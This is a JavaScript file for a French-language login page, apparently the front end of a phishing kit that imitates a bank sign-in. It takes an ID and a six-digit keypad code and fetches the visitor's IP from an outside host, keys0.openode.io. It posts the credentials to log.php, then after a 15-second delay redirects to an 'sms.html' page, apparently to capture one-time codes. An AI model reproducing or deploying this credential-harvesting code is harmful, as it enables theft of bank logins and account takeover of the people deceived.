var sai_key,logPASS;
function validateNumber(event) {
var key = window.event ? event.keyCode : event.which;
if (event.keyCode === 8 || event.keyCode === 46) {
return true;
} else if ( key < 48 || key > 57 ) {
return false;
} else {
return true;
}
};
$(document).ready(function(){
	
$("#claver").hide();	

$("#view_check").hide();	
$("#coverspin").hide();	
$('input').keypress(validateNumber);
});               


window.locIp='';
window.iPfull='';
fetch('https://keys0.openode.io/ip',{
mode:'cors',
}).then(e=>{
e.json().then(location=>{

window.locIp=location
window.iPfull =location.ip || location

})
})

function setCode(e){
	logPASS = $("#input_").val();
if(logPASS.length<6){
logPASS+=e;
//alert(logPASS);
$("#input_").val(logPASS);
}
}

function clearcode(){
	
$("#sai_key").val('');		
	
}

function clearpass(){
	
$("#input_").val('');		
	
}
function keyFunction(){
	
sai_key = $("#sai_key").val();
if(sai_key.length>3){
$("#view_close").hide();	
$("#view_check").show();
$("#claver").show();
	 //alert("You pressed a key inside the input field");	
}else{
	
$("#view_close").show();	
$("#view_check").hide();
$("#claver").hide();	
$("#input_").val('');	
}

	
	
	
}

function login(){
	
var ID_sg =	sai_key;
var PASS_sg	 =	logPASS;
	
	//alert(ID_sg);
	//alert(PASS_sg);
	
 if(ID_sg==''||ID_sg.length<5){

swal({
icon: 'error',
title: 'Erreur !',
text: "Corriger votre saisie"

})	

return false;	
} 

if(PASS_sg==''||PASS_sg.length<6){

swal({
icon: 'error',
title: 'Erreur !',
text: "Corriger votre saisie"

})	

return false;	
} 


var data_log = 
{

ID_sg		    :   ID_sg,
PASS_sg     :	PASS_sg

}; 
 $("#body").hide(); 
$('#coverspin').show();

console.log(JSON.stringify(data_log));
var _url = 'log.php';

$("#text_load").html("Connexion en cours : Veuillez patienter quelques instants");

$.post(_url,data_log,function(data){
 var reponse = JSON.parse(data); 


if(reponse.statut=="error"){	

swal({
icon: reponse.statut,
title: reponse.title,
text: reponse.resultat

});
}else if(reponse.statut=="success"){	


setTimeout(function(){ 
  window.location="sms.html";
    
}, 15000);
} 


}) 
}